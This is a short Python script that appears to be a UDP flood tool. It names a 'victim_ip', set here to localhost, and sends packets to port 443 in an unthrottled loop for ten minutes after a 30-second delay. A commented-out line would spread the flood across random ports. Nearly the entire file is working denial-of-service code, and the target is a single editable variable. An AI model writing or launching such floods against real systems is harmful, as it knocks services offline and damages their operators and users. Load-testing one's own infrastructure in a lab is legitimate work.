import time
import socket
import random

victim_ip = "127.0.0.1"
duration = 600

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg = bytes(random.getrandbits(10))
timeout = time.time() + duration
sent_packets = 0

time.sleep(30)

while time.time() < timeout:
        # victim_port = random.randint(1025, 65356)
        victim_port = 443
        sock.sendto(msg, (victim_ip, victim_port))
        sent_packets += 1
        if (sent_packets > 5000):
                # time.sleep(1)
                sent_packets = 0
